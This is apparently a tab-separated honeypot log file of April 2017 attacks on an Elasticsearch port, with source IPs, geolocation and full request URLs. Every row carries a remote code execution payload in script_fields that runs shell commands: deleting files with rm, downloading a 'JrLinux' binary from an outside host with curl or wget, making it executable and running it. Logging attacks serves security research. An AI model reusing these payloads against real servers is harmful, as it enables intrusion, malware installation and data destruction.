id	ident	normalized	timestamp	unixTimestamp	week day	year	month	day	hour	minutes	seconds	channel	source_ip	source_ip_num	source_port	destination_ip	destination_ip_num	destination_port	protocol	city	province	province_code	country	country_code	continent	latitude	longitude	asn	method	type	URL	form	user_agent
58e9c22d93e0950608bc7e33	78169b80-5ce8-11e6-94de-0800272a9814	True	2017-04-09 01:10:05.244	1491700205.244	Sun	2017	4	9	1	10	5.244	elastichoney.events	120.24.79.205	2014859213	None	192.168.10.6	3232238086	9200	None	Shenzhen	Guangdong	44	China	CN	Asia	22.5333	114.1333	Hangzhou Alibaba Advertising Co. -Ltd.	GET	attack	"192.168.10.6:9200/_search?source={""size"":1,""query"":{""filtered"":{""query"":{""match_all"":{}}}},""script_fields"":{""exp"":{""script"":""import java.util.*;\nimport java.io.*;\nString str = \""\"";BufferedReader br = new BufferedReader(new InputStreamReader(Runtime.getRuntime().exec(\""rm /tmp/*\"").getInputStream()));StringBuilder sb = new StringBuilder();while((str=br.readLine())!=null){sb.append(str);}sb.toString();""}}}"	"source={""size"":1,""query"":{""filtered"":{""query"":{""match_all"":{}}}},""script_fields"":{""exp"":{""script"":""import+java.util.*;\nimport+java.io.*;\nString+str+=+\""\"";BufferedReader+br+=+new+BufferedReader(new+InputStreamReader(Runtime.getRuntime().exec(\""rm+/tmp/*\"").getInputStream()));StringBuilder+sb+=+new+StringBuilder();while((str=br.readLine())!=null){sb.append(str);}sb.toString();""}}}"	Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0)
58fa01c193e0950608bf7807	78169b80-5ce8-11e6-94de-0800272a9814	True	2017-04-21 08:57:37.462	1492765057.4620001	Fri	2017	4	21	8	57	37.461999999999996	elastichoney.events	112.16.94.35	1880120867	None	192.168.10.6	3232238086	9200	None	Hangzhou	Zhejiang	33	China	CN	Asia	30.2936	120.1614	China Mobile communications corporation	GET	attack	"192.168.10.6:9200/_search?source={""size"":1,""query"":{""filtered"":{""query"":{""match_all"":{}}}},""script_fields"":{""exp"":{""script"":""import java.util.*;\nimport java.io.*;\nString str = \""\"";BufferedReader br = new BufferedReader(new InputStreamReader(Runtime.getRuntime().exec(\""rm *\"").getInputStream()));StringBuilder sb = new StringBuilder();while((str=br.readLine())!=null){sb.append(str);}sb.toString();""}}}"	"source={""size"":1,""query"":{""filtered"":{""query"":{""match_all"":{}}}},""script_fields"":{""exp"":{""script"":""import+java.util.*;\nimport+java.io.*;\nString+str+=+\""\"";BufferedReader+br+=+new+BufferedReader(new+InputStreamReader(Runtime.getRuntime().exec(\""rm+*\"").getInputStream()));StringBuilder+sb+=+new+StringBuilder();while((str=br.readLine())!=null){sb.append(str);}sb.toString();""}}}"	Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0)
58ff479393e0950608bfb025	78169b80-5ce8-11e6-94de-0800272a9814	True	2017-04-25 08:56:51.399	1493110611.399	Tue	2017	4	25	8	56	51.398999999999994	elastichoney.events	171.92.208.42	2874986538	None	192.168.10.6	3232238086	9200	None	Chengdu	Sichuan	51	China	CN	Asia	30.6667	104.0667	CHINANET SiChuan Telecom Internet Data Center	GET	attack	"192.168.10.6:9200/_search?source={""size"":1,""query"":{""filtered"":{""query"":{""match_all"":{}}}},""script_fields"":{""exp"":{""script"":""import java.util.*;\nimport java.io.*;\nString str = \""\"";BufferedReader br = new BufferedReader(new InputStreamReader(Runtime.getRuntime().exec(\""rm *\"").getInputStream()));StringBuilder sb = new StringBuilder();while((str=br.readLine())!=null){sb.append(str);}sb.toString();""}}}"	"source={""size"":1,""query"":{""filtered"":{""query"":{""match_all"":{}}}},""script_fields"":{""exp"":{""script"":""import+java.util.*;\nimport+java.io.*;\nString+str+=+\""\"";BufferedReader+br+=+new+BufferedReader(new+InputStreamReader(Runtime.getRuntime().exec(\""rm+*\"").getInputStream()));StringBuilder+sb+=+new+StringBuilder();while((str=br.readLine())!=null){sb.append(str);}sb.toString();""}}}"	Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0)
58ff479a93e0950608bfb027	78169b80-5ce8-11e6-94de-0800272a9814	True	2017-04-25 08:56:58.721	1493110618.721	Tue	2017	4	25	8	56	58.721000000000004	elastichoney.events	171.92.208.42	2874986538	None	192.168.10.6	3232238086	9200	None	Chengdu	Sichuan	51	China	CN	Asia	30.6667	104.0667	CHINANET SiChuan Telecom Internet Data Center	GET	attack	"192.168.10.6:9200/_search?source={""size"":1,""query"":{""filtered"":{""query"":{""match_all"":{}}}},""script_fields"":{""exp"":{""script"":""import java.util.*;\nimport java.io.*;\nString str = \""\"";BufferedReader br = new BufferedReader(new InputStreamReader(Runtime.getRuntime().exec(\""curl -o /tmp/JrLinux http://27.151.13.170:1234/JrLinux\"").getInputStream()));StringBuilder sb = new StringBuilder();while((str=br.readLine())!=null){sb.append(str);}sb.toString();""}}}"	"source={""size"":1,""query"":{""filtered"":{""query"":{""match_all"":{}}}},""script_fields"":{""exp"":{""script"":""import+java.util.*;\nimport+java.io.*;\nString+str+=+\""\"";BufferedReader+br+=+new+BufferedReader(new+InputStreamReader(Runtime.getRuntime().exec(\""curl+-o+/tmp/JrLinux+http://27.151.13.170:1234/JrLinux\"").getInputStream()));StringBuilder+sb+=+new+StringBuilder();while((str=br.readLine())!=null){sb.append(str);}sb.toString();""}}}"	Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0)
58ff47a493e0950608bfb029	78169b80-5ce8-11e6-94de-0800272a9814	True	2017-04-25 08:57:08.833	1493110628.833	Tue	2017	4	25	8	57	8.833	elastichoney.events	171.92.208.42	2874986538	None	192.168.10.6	3232238086	9200	None	Chengdu	Sichuan	51	China	CN	Asia	30.6667	104.0667	CHINANET SiChuan Telecom Internet Data Center	GET	attack	"192.168.10.6:9200/_search?source={""size"":1,""query"":{""filtered"":{""query"":{""match_all"":{}}}},""script_fields"":{""exp"":{""script"":""import java.util.*;\nimport java.io.*;\nString str = \""\"";BufferedReader br = new BufferedReader(new InputStreamReader(Runtime.getRuntime().exec(\""wget -c http://27.151.13.170:1234/JrLinux\"").getInputStream()));StringBuilder sb = new StringBuilder();while((str=br.readLine())!=null){sb.append(str);}sb.toString();""}}}"	"source={""size"":1,""query"":{""filtered"":{""query"":{""match_all"":{}}}},""script_fields"":{""exp"":{""script"":""import+java.util.*;\nimport+java.io.*;\nString+str+=+\""\"";BufferedReader+br+=+new+BufferedReader(new+InputStreamReader(Runtime.getRuntime().exec(\""wget+-c+http://27.151.13.170:1234/JrLinux\"").getInputStream()));StringBuilder+sb+=+new+StringBuilder();while((str=br.readLine())!=null){sb.append(str);}sb.toString();""}}}"	Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0)
58ff47ab93e0950608bfb02b	78169b80-5ce8-11e6-94de-0800272a9814	True	2017-04-25 08:57:15.807	1493110635.8070002	Tue	2017	4	25	8	57	15.807	elastichoney.events	171.92.208.42	2874986538	None	192.168.10.6	3232238086	9200	None	Chengdu	Sichuan	51	China	CN	Asia	30.6667	104.0667	CHINANET SiChuan Telecom Internet Data Center	GET	attack	"192.168.10.6:9200/_search?source={""size"":1,""query"":{""filtered"":{""query"":{""match_all"":{}}}},""script_fields"":{""exp"":{""script"":""import java.util.*;\nimport java.io.*;\nString str = \""\"";BufferedReader br = new BufferedReader(new InputStreamReader(Runtime.getRuntime().exec(\""chmod 777 /tmp/./JrLinux\"").getInputStream()));StringBuilder sb = new StringBuilder();while((str=br.readLine())!=null){sb.append(str);}sb.toString();""}}}"	"source={""size"":1,""query"":{""filtered"":{""query"":{""match_all"":{}}}},""script_fields"":{""exp"":{""script"":""import+java.util.*;\nimport+java.io.*;\nString+str+=+\""\"";BufferedReader+br+=+new+BufferedReader(new+InputStreamReader(Runtime.getRuntime().exec(\""chmod+777+/tmp/./JrLinux\"").getInputStream()));StringBuilder+sb+=+new+StringBuilder();while((str=br.readLine())!=null){sb.append(str);}sb.toString();""}}}"	Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0)
58ff47b193e0950608bfb02d	78169b80-5ce8-11e6-94de-0800272a9814	True	2017-04-25 08:57:21.159	1493110641.159	Tue	2017	4	25	8	57	21.159000000000002	elastichoney.events	171.92.208.42	2874986538	None	192.168.10.6	3232238086	9200	None	Chengdu	Sichuan	51	China	CN	Asia	30.6667	104.0667	CHINANET SiChuan Telecom Internet Data Center	GET	attack	"192.168.10.6:9200/_search?source={""size"":1,""query"":{""filtered"":{""query"":{""match_all"":{}}}},""script_fields"":{""exp"":{""script"":""import java.util.*;\nimport java.io.*;\nString str = \""\"";BufferedReader br = new BufferedReader(new InputStreamReader(Runtime.getRuntime().exec(\""/tmp/./JrLinux\"").getInputStream()));StringBuilder sb = new StringBuilder();while((str=br.readLine())!=null){sb.append(str);}sb.toString();""}}}"	"source={""size"":1,""query"":{""filtered"":{""query"":{""match_all"":{}}}},""script_fields"":{""exp"":{""script"":""import+java.util.*;\nimport+java.io.*;\nString+str+=+\""\"";BufferedReader+br+=+new+BufferedReader(new+InputStreamReader(Runtime.getRuntime().exec(\""/tmp/./JrLinux\"").getInputStream()));StringBuilder+sb+=+new+StringBuilder();while((str=br.readLine())!=null){sb.append(str);}sb.toString();""}}}"	Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0)
58ff47b693e0950608bfb02f	78169b80-5ce8-11e6-94de-0800272a9814	True	2017-04-25 08:57:26.627	1493110646.627	Tue	2017	4	25	8	57	26.627	elastichoney.events	171.92.208.42	2874986538	None	192.168.10.6	3232238086	9200	None	Chengdu	Sichuan	51	China	CN	Asia	30.6667	104.0667	CHINANET SiChuan Telecom Internet Data Center	GET	attack	"192.168.10.6:9200/_search?source={""size"":1,""query"":{""filtered"":{""query"":{""match_all"":{}}}},""script_fields"":{""exp"":{""script"":""import java.util.*;\nimport java.io.*;\nString str = \""\"";BufferedReader br = new BufferedReader(new InputStreamReader(Runtime.getRuntime().exec(\""rm /tmp/*\"").getInputStream()));StringBuilder sb = new StringBuilder();while((str=br.readLine())!=null){sb.append(str);}sb.toString();""}}}"	"source={""size"":1,""query"":{""filtered"":{""query"":{""match_all"":{}}}},""script_fields"":{""exp"":{""script"":""import+java.util.*;\nimport+java.io.*;\nString+str+=+\""\"";BufferedReader+br+=+new+BufferedReader(new+InputStreamReader(Runtime.getRuntime().exec(\""rm+/tmp/*\"").getInputStream()));StringBuilder+sb+=+new+StringBuilder();while((str=br.readLine())!=null){sb.append(str);}sb.toString();""}}}"	Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0)
58ffbda293e0950608bfb36d	78169b80-5ce8-11e6-94de-0800272a9814	True	2017-04-25 17:20:34.101	1493140834.101	Tue	2017	4	25	17	20	34.101	elastichoney.events	171.92.208.42	2874986538	None	192.168.10.6	3232238086	9200	None	Chengdu	Sichuan	51	China	CN	Asia	30.6667	104.0667	CHINANET SiChuan Telecom Internet Data Center	GET	attack	"192.168.10.6:9200/_search?source={""size"":1,""query"":{""filtered"":{""query"":{""match_all"":{}}}},""script_fields"":{""exp"":{""script"":""import java.util.*;\nimport java.io.*;\nString str = \""\"";BufferedReader br = new BufferedReader(new InputStreamReader(Runtime.getRuntime().exec(\""rm /tmp/*\"").getInputStream()));StringBuilder sb = new StringBuilder();while((str=br.readLine())!=null){sb.append(str);}sb.toString();""}}}"	"source={""size"":1,""query"":{""filtered"":{""query"":{""match_all"":{}}}},""script_fields"":{""exp"":{""script"":""import+java.util.*;\nimport+java.io.*;\nString+str+=+\""\"";BufferedReader+br+=+new+BufferedReader(new+InputStreamReader(Runtime.getRuntime().exec(\""rm+/tmp/*\"").getInputStream()));StringBuilder+sb+=+new+StringBuilder();while((str=br.readLine())!=null){sb.append(str);}sb.toString();""}}}"	Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0)
58ffc55f93e0950608bfb3a9	78169b80-5ce8-11e6-94de-0800272a9814	True	2017-04-25 17:53:35.526	1493142815.526	Tue	2017	4	25	17	53	35.525999999999996	elastichoney.events	171.92.208.42	2874986538	None	192.168.10.6	3232238086	9200	None	Chengdu	Sichuan	51	China	CN	Asia	30.6667	104.0667	CHINANET SiChuan Telecom Internet Data Center	GET	attack	"192.168.10.6:9200/_search?source={""size"":1,""query"":{""filtered"":{""query"":{""match_all"":{}}}},""script_fields"":{""exp"":{""script"":""import java.util.*;\nimport java.io.*;\nString str = \""\"";BufferedReader br = new BufferedReader(new InputStreamReader(Runtime.getRuntime().exec(\""rm *\"").getInputStream()));StringBuilder sb = new StringBuilder();while((str=br.readLine())!=null){sb.append(str);}sb.toString();""}}}"	"source={""size"":1,""query"":{""filtered"":{""query"":{""match_all"":{}}}},""script_fields"":{""exp"":{""script"":""import+java.util.*;\nimport+java.io.*;\nString+str+=+\""\"";BufferedReader+br+=+new+BufferedReader(new+InputStreamReader(Runtime.getRuntime().exec(\""rm+*\"").getInputStream()));StringBuilder+sb+=+new+StringBuilder();while((str=br.readLine())!=null){sb.append(str);}sb.toString();""}}}"	Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0)
58ffc56a93e0950608bfb3ab	78169b80-5ce8-11e6-94de-0800272a9814	True	2017-04-25 17:53:46.350	1493142826.35	Tue	2017	4	25	17	53	46.35	elastichoney.events	171.92.208.42	2874986538	None	192.168.10.6	3232238086	9200	None	Chengdu	Sichuan	51	China	CN	Asia	30.6667	104.0667	CHINANET SiChuan Telecom Internet Data Center	GET	attack	"192.168.10.6:9200/_search?source={""size"":1,""query"":{""filtered"":{""query"":{""match_all"":{}}}},""script_fields"":{""exp"":{""script"":""import java.util.*;\nimport java.io.*;\nString str = \""\"";BufferedReader br = new BufferedReader(new InputStreamReader(Runtime.getRuntime().exec(\""wget -c http://27.151.13.170:1234/JrLinux\"").getInputStream()));StringBuilder sb = new StringBuilder();while((str=br.readLine())!=null){sb.append(str);}sb.toString();""}}}"	"source={""size"":1,""query"":{""filtered"":{""query"":{""match_all"":{}}}},""script_fields"":{""exp"":{""script"":""import+java.util.*;\nimport+java.io.*;\nString+str+=+\""\"";BufferedReader+br+=+new+BufferedReader(new+InputStreamReader(Runtime.getRuntime().exec(\""wget+-c+http://27.151.13.170:1234/JrLinux\"").getInputStream()));StringBuilder+sb+=+new+StringBuilder();while((str=br.readLine())!=null){sb.append(str);}sb.toString();""}}}"	Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0)
58ffc56f93e0950608bfb3ad	78169b80-5ce8-11e6-94de-0800272a9814	True	2017-04-25 17:53:51.722	1493142831.7220001	Tue	2017	4	25	17	53	51.722	elastichoney.events	171.92.208.42	2874986538	None	192.168.10.6	3232238086	9200	None	Chengdu	Sichuan	51	China	CN	Asia	30.6667	104.0667	CHINANET SiChuan Telecom Internet Data Center	GET	attack	"192.168.10.6:9200/_search?source={""size"":1,""query"":{""filtered"":{""query"":{""match_all"":{}}}},""script_fields"":{""exp"":{""script"":""import java.util.*;\nimport java.io.*;\nString str = \""\"";BufferedReader br = new BufferedReader(new InputStreamReader(Runtime.getRuntime().exec(\""chmod 777 /tmp/./JrLinux\"").getInputStream()));StringBuilder sb = new StringBuilder();while((str=br.readLine())!=null){sb.append(str);}sb.toString();""}}}"	"source={""size"":1,""query"":{""filtered"":{""query"":{""match_all"":{}}}},""script_fields"":{""exp"":{""script"":""import+java.util.*;\nimport+java.io.*;\nString+str+=+\""\"";BufferedReader+br+=+new+BufferedReader(new+InputStreamReader(Runtime.getRuntime().exec(\""chmod+777+/tmp/./JrLinux\"").getInputStream()));StringBuilder+sb+=+new+StringBuilder();while((str=br.readLine())!=null){sb.append(str);}sb.toString();""}}}"	Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0)
58ffc57593e0950608bfb3af	78169b80-5ce8-11e6-94de-0800272a9814	True	2017-04-25 17:53:57.077	1493142837.0770001	Tue	2017	4	25	17	53	57.077	elastichoney.events	171.92.208.42	2874986538	None	192.168.10.6	3232238086	9200	None	Chengdu	Sichuan	51	China	CN	Asia	30.6667	104.0667	CHINANET SiChuan Telecom Internet Data Center	GET	attack	"192.168.10.6:9200/_search?source={""size"":1,""query"":{""filtered"":{""query"":{""match_all"":{}}}},""script_fields"":{""exp"":{""script"":""import java.util.*;\nimport java.io.*;\nString str = \""\"";BufferedReader br = new BufferedReader(new InputStreamReader(Runtime.getRuntime().exec(\""/tmp/./JrLinux\"").getInputStream()));StringBuilder sb = new StringBuilder();while((str=br.readLine())!=null){sb.append(str);}sb.toString();""}}}"	"source={""size"":1,""query"":{""filtered"":{""query"":{""match_all"":{}}}},""script_fields"":{""exp"":{""script"":""import+java.util.*;\nimport+java.io.*;\nString+str+=+\""\"";BufferedReader+br+=+new+BufferedReader(new+InputStreamReader(Runtime.getRuntime().exec(\""/tmp/./JrLinux\"").getInputStream()));StringBuilder+sb+=+new+StringBuilder();while((str=br.readLine())!=null){sb.append(str);}sb.toString();""}}}"	Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0)
58ffc57a93e0950608bfb3b1	78169b80-5ce8-11e6-94de-0800272a9814	True	2017-04-25 17:54:02.379	1493142842.379	Tue	2017	4	25	17	54	2.379	elastichoney.events	171.92.208.42	2874986538	None	192.168.10.6	3232238086	9200	None	Chengdu	Sichuan	51	China	CN	Asia	30.6667	104.0667	CHINANET SiChuan Telecom Internet Data Center	GET	attack	"192.168.10.6:9200/_search?source={""size"":1,""query"":{""filtered"":{""query"":{""match_all"":{}}}},""script_fields"":{""exp"":{""script"":""import java.util.*;\nimport java.io.*;\nString str = \""\"";BufferedReader br = new BufferedReader(new InputStreamReader(Runtime.getRuntime().exec(\""rm /tmp/*\"").getInputStream()));StringBuilder sb = new StringBuilder();while((str=br.readLine())!=null){sb.append(str);}sb.toString();""}}}"	"source={""size"":1,""query"":{""filtered"":{""query"":{""match_all"":{}}}},""script_fields"":{""exp"":{""script"":""import+java.util.*;\nimport+java.io.*;\nString+str+=+\""\"";BufferedReader+br+=+new+BufferedReader(new+InputStreamReader(Runtime.getRuntime().exec(\""rm+/tmp/*\"").getInputStream()));StringBuilder+sb+=+new+StringBuilder();while((str=br.readLine())!=null){sb.append(str);}sb.toString();""}}}"	Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0)
58ffdb5893e0950608bfb42b	78169b80-5ce8-11e6-94de-0800272a9814	True	2017-04-25 19:27:20.410	1493148440.41	Tue	2017	4	25	19	27	20.41	elastichoney.events	171.92.208.42	2874986538	None	192.168.10.6	3232238086	9200	None	Chengdu	Sichuan	51	China	CN	Asia	30.6667	104.0667	CHINANET SiChuan Telecom Internet Data Center	GET	attack	"192.168.10.6:9200/_search?source={""size"":1,""query"":{""filtered"":{""query"":{""match_all"":{}}}},""script_fields"":{""exp"":{""script"":""import java.util.*;\nimport java.io.*;\nString str = \""\"";BufferedReader br = new BufferedReader(new InputStreamReader(Runtime.getRuntime().exec(\""rm /tmp/*\"").getInputStream()));StringBuilder sb = new StringBuilder();while((str=br.readLine())!=null){sb.append(str);}sb.toString();""}}}"	"source={""size"":1,""query"":{""filtered"":{""query"":{""match_all"":{}}}},""script_fields"":{""exp"":{""script"":""import+java.util.*;\nimport+java.io.*;\nString+str+=+\""\"";BufferedReader+br+=+new+BufferedReader(new+InputStreamReader(Runtime.getRuntime().exec(\""rm+/tmp/*\"").getInputStream()));StringBuilder+sb+=+new+StringBuilder();while((str=br.readLine())!=null){sb.append(str);}sb.toString();""}}}"	Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0)
58ffe2c393e0950608bfb493	78169b80-5ce8-11e6-94de-0800272a9814	True	2017-04-25 19:58:59.977	1493150339.9770002	Tue	2017	4	25	19	58	59.977	elastichoney.events	171.92.208.42	2874986538	None	192.168.10.6	3232238086	9200	None	Chengdu	Sichuan	51	China	CN	Asia	30.6667	104.0667	CHINANET SiChuan Telecom Internet Data Center	GET	attack	"192.168.10.6:9200/_search?source={""size"":1,""query"":{""filtered"":{""query"":{""match_all"":{}}}},""script_fields"":{""exp"":{""script"":""import java.util.*;\nimport java.io.*;\nString str = \""\"";BufferedReader br = new BufferedReader(new InputStreamReader(Runtime.getRuntime().exec(\""rm *\"").getInputStream()));StringBuilder sb = new StringBuilder();while((str=br.readLine())!=null){sb.append(str);}sb.toString();""}}}"	"source={""size"":1,""query"":{""filtered"":{""query"":{""match_all"":{}}}},""script_fields"":{""exp"":{""script"":""import+java.util.*;\nimport+java.io.*;\nString+str+=+\""\"";BufferedReader+br+=+new+BufferedReader(new+InputStreamReader(Runtime.getRuntime().exec(\""rm+*\"").getInputStream()));StringBuilder+sb+=+new+StringBuilder();while((str=br.readLine())!=null){sb.append(str);}sb.toString();""}}}"	Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0)
